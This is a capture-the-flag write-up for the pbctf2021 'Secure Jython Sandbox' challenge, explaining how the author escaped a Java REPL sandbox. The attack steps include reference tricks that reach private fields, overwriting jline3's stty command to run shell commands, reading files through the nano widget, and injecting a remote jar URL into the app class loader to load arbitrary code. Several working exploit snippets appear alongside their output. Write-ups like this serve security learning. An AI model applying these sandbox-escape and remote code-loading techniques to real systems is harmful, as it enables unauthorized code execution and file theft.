# pbctf2021 - Secure Jython Sandbox

## Introduction

> We've seen too many python sandboxes... why don't we give some love for Jython ;P?
>
> Here's a trimmed-down, secure[citation needed], totally noncompliant jython implementation that
> doesn't let you do a whole lot of stuff, with a little twist added to it!
>
> [deploy.tar.gz](deploy.tar.gz)

This challenge does not utilize [Jython](https://www.jython.org/), but contains a tiny (and really
cool) implementation of Java REPL. In addition to a subset of Python grammar, It supports C-like
reference/dereference as well (with operator `&` and `*`). Sadly, method invocations are
forbidden. All we can do is access (get and set) objects' fields and the goal is to escape the
sandbox.

## The magic of referencing

How can (de)referencing be used in Python or Java?

Although `import` is allowed, we can only access to `java.lang.reflect.Field` objects directly.

```
>>> import java.lang
>>> java.lang.System.lineSeparator
private static java.lang.String java.lang.System.lineSeparator
>>> java.lang.System.lineSeparator.value
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'java.lang.reflect.Field' object has no attribute 'value'
>>> "\n".value
array('b', [10])
```

With the help of the operator `&`, we can get an object of `jython.rts.ObjectTraitImpl$MemberRef`,
alter its' field, and dereference it to access more. For example, to get static
class fields:

```
>>> # Get java.lang.System.lineSeparator
>>> import java.lang
>>> v = &1.value
>>> v.self = java.lang.System
>>> v.member = java.lang.System.lineSeparator
>>> *v
'\n'
```

What's more, direct field ref is limited to declared and public ones by design. That is, private
and protected fields of parent classes cannot be accessed directly. Referencing may be leveraged
to bypass it:

```
>>> v = &1.value
>>> v.self = java.lang.Thread$State
>>> v.member = java.lang.Thread$State.NEW
>>> e = *v
>>> e.__class__
<class 'java.lang.Thread$State'>
>>> e.ordinal
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'java.lang.Thread$State' object has no attribute 'ordinal'
>>>
>>> # Get NEW.ordinal (a private field of java.lang.Enum)
>>> v.self = e
>>> v.member = java.lang.Enum.ordinal
>>> *v
0
```

This interesting "feature" seems to be a key point to solve the problem.

## Shortcut: arbitrary file read

After walking through the vendor library `jline3`, We found some useful gadgets for exploiting.
Soon we noted that the default Linux terminal implementation in `jline3` executes `stty` in every
`readline()` process. Once the command string is modified, it may help us to run arbitrary commands.
A PoC script does trigger `ls` command locally:

```
# with the default terminal ONLY
>>> import org.jline.utils
>>> a = &1.value
>>> a.self = org.jline.utils.OSUtils
>>> a.member = org.jline.utils.OSUtils.STTY_COMMAND
>>> *a = 'ls'
>>>
Exception in thread "main" java.io.IOError: java.io.IOException: Error executing 'ls min 0 time 1': ls: cannot access 'min': No such file or directory
ls: cannot access '0': No such file or directory
ls: cannot access 'time': No such file or directory
ls: cannot access '1': No such file or directory
...
```

However, this script does not work on the remote side. We compared the leading texts returned from
both sides and figured out that the remote environment ran `jython` without attaching to
a TTY. The remote environment can be simulated by running in the following way:

```
cat | ./jython
WARNING: Unable to create a system terminal, creating a dumb terminal (enable debug logging for more information)
Jython 2.8.999 (sandbox-standard v1.2)
[OpenJDK 64-Bit Server VM (N/A)] on java16.0.2
Type "help", "copyright", "credits" or "license" for more information.
>>>
```

The dumb terminal (`org.jline.terminal.impl.DumbTerminal`) doesn't execute commands at all.
Furthermore, some built-in Java implementations of common commands like `less` and `nano` are
eye-catching as well. We found a way to use `nano` for opening files like this:

```
# with the default terminal ONLY
import jython
import org

# Get jython.Repl.reader
reader = &1.value
reader.self = jython.Repl
reader.member = jython.Repl.reader
# Call the nano widget
(*reader).widgets["callback-init"] = (*reader).widgets["edit-and-execute-command"]
```

Once the nano widget shows, press `Ctrl + R`, enter the filename, and press `Enter` to get the file
content.

The above method doesn't work without a TTY as well. Although setting columns and rows for the
terminal eliminates exceptions raised after bringing up the widget, the last `Enter` key pressing
can't trigger in the dumb terminal via common key sequences. We looked into related code and found
that the key cause is that the line reader (`org.jline.reader.impl.LineReaderImpl`) checks if the
terminal is dumb and ignores CR when it is. Only CR maps into the `ACCEPT` command in nano.

```java
// reader/src/main/java/org/jline/reader/impl/LineReaderImpl.java:619
if (!dumb) {
  ...
} else {
    // For dumb terminals, we need to make sure that CR are ignored
    Attributes attr = new Attributes(originalAttributes);
    attr.setInputFlag(Attributes.InputFlag.IGNCR, true);
    terminal.setAttributes(attr);
}
```

By using the second technique in the last chapter, we can modify the protected field in
`AbstractTerminal` to bypass the dumb check. The final exploit goes like
[solve_file_read.py](solve_file_read.py). This (unintended) solution helped us (Water Paddler) to
get the flag during the competition.

## Towards arbitrary code execution

> theKidOfArcrania: basically you had to go into the builtin class loaders and add your own url to it

After the competition, I had more time to dig into Java internals and try to do this in the intended
way.

The first step is to get access to fields in all modules. The program starts to open the `java.lang`
package only to unnamed modules, which means that fields in other packages are not allowed to access
directly:

```
>>> [].size
java.lang.reflect.InaccessibleObjectException: Unable to make field private int java.util.ArrayList.size accessible: module java.base does not "opens java.util" to unnamed module @4690b489
        at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:357)
        at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)
        at java.base/java.lang.reflect.Field.checkCanSetAccessible(Field.java:177)
```

The accessible check can be bypassed easily through analyzing the checking logic: set
`module` field of class `jython.rts.ObjectTraitImpl$FieldRef` to `java.base`.

```
# open all packages
import java
f = &1.value
field_ref = f.__class__
mod = &1.value
mod.self = field_ref
mod.member = java.lang.Class.module

boot_layer = &1.value
boot_layer.self = java.lang.System
boot_layer.member = java.lang.System.bootLayer
module_base = (*boot_layer).nameToModule["java.base"]
*mod = module_base
```

However, even with all packages opened, some fields are not able to access since the Java runtime
filters sensitive methods and fields in reflection:

```java
// jdk/internal/reflect/Reflection.java:42

    /** Used to filter out fields and methods from certain classes from public
        view, where they are sensitive or they may contain VM-internal objects.
        These Maps are updated very rarely. Rather than synchronize on
        each access, we use copy-on-write */
    private static volatile Map<Class<?>, Set<String>> fieldFilterMap;
    private static volatile Map<Class<?>, Set<String>> methodFilterMap;
    private static final String WILDCARD = "*";
    public static final Set<String> ALL_MEMBERS = Set.of(WILDCARD);

    static {
        fieldFilterMap = Map.of(
            Reflection.class, ALL_MEMBERS,
            AccessibleObject.class, ALL_MEMBERS,
            Class.class, Set.of("classLoader", "classData"),
            ClassLoader.class, ALL_MEMBERS,
            Constructor.class, ALL_MEMBERS,
            Field.class, ALL_MEMBERS,
            Method.class, ALL_MEMBERS,
            Module.class, ALL_MEMBERS,
            System.class, Set.of("security")
        );
```

I spent quite a long time on how to handle it out but with no luck. Considering the hint released by
the author after the competition, I turned to dive into built-in class loading processes.

There are 3 built-in class loaders in `jdk.internal.loader.Loaders` and only the `APP_LOADER` has
capabilities for network class loading (via `jdk.internal.loader.URLClassPath`). For loading a new
class from remote, we need to inject a jar URL into the class path. The exploition process goes like
below:

1. Get the instance of `jdk.internal.loader.ClassLoaders$AppClassLoader` via
   `jdk.internal.loader.ClassLoaders.APP_LOADER`.
2. Extract `jdk.internal.loader.URLClassPath` from `jdk.internal.loader.BuiltinClassLoader.ucp`.
3. To simulate the process of `jdk.internal.loader.URLClasspath.addURL(url)`, append a `java.net.URL`
   object into `unopenedUrls`.
4. Trigger class loading via `import`.

For full details, please reference the script [solve.py](solve.py).
